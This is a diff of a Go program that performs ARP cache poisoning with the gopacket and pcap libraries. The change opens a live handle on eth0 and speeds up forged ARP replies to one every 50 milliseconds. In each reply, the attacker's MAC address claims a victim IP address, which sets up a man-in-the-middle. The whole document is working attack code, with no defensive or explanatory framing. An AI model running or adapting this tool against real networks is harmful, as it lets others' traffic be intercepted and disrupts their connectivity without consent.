@@ -3,15 +3,16 @@ package main
 import (
 	"context"
 	"fmt"
-	"net"
-	"time"
-
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 	"github.com/google/gopacket/pcap"
+	"net"
+	"time"
 )
 
-func launchPoisoning(ip_src net.IP, mac_src net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, handle *pcap.Handle, ctx context.Context) {
+func launchPoisoning(ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr, ctx context.Context) {
+	handle := createPoisoningHandle("eth0")
+	defer handle.Close()
 	count := 0
 	for {
 		select {
@@ -19,23 +20,25 @@ func launchPoisoning(ip_src net.IP, mac_src net.HardwareAddr, ip_target net.IP, 
 			fmt.Println("Received SIGTERM, Stop poisoning")
 			return
 		default:
-			writeARP(handle, ip_src, mac_src, ip_target, mac_target)
-			// writeARP(handle, ip_target, mac_target, ip_src, mac_src)
+			poisoningARP(handle, ip_to_usurpate, my_mac, ip_target, mac_target)
 			printPoisoning(&count)
-			time.Sleep(1 * time.Second)
+			time.Sleep(50 * time.Millisecond)
 		}
 	}
-
 }
 
-func launchRecuperation(ip_src string, mac_src string, ip_target string, mac_target string) {
-	fmt.Println("Launch recuperation")
+func createPoisoningHandle(nameOfdevice string) *pcap.Handle {
+	handle, err := pcap.OpenLive(nameOfdevice, 1600, true, pcap.BlockForever)
+	if err != nil {
+		panic(err)
+	}
+	return handle
 }
 
-func writeARP(handle *pcap.Handle, ip_to_usurpate net.IP, mac_of_attaquant net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {
+func poisoningARP(handle *pcap.Handle, ip_to_usurpate net.IP, my_mac net.HardwareAddr, ip_target net.IP, mac_target net.HardwareAddr) error {
 
 	eth := layers.Ethernet{
-		SrcMAC:       mac_of_attaquant,
+		SrcMAC:       my_mac,
 		DstMAC:       mac_target,
 		EthernetType: layers.EthernetTypeARP,
 	}
@@ -46,10 +49,10 @@ func writeARP(handle *pcap.Handle, ip_to_usurpate net.IP, mac_of_attaquant net.H
 		HwAddressSize:     6,
 		ProtAddressSize:   4,
 		Operation:         layers.ARPReply,
-		SourceHwAddress:   mac_of_attaquant,
-		SourceProtAddress: ip_to_usurpate,
-		DstHwAddress:      mac_target,
-		DstProtAddress:    ip_target,
+		SourceHwAddress:   []byte(my_mac),
+		SourceProtAddress: []byte(ip_to_usurpate.To4()),
+		DstHwAddress:      []byte(mac_target),
+		DstProtAddress:    []byte(ip_target.To4()),
 	}
 
 	buf := gopacket.NewSerializeBuffer()
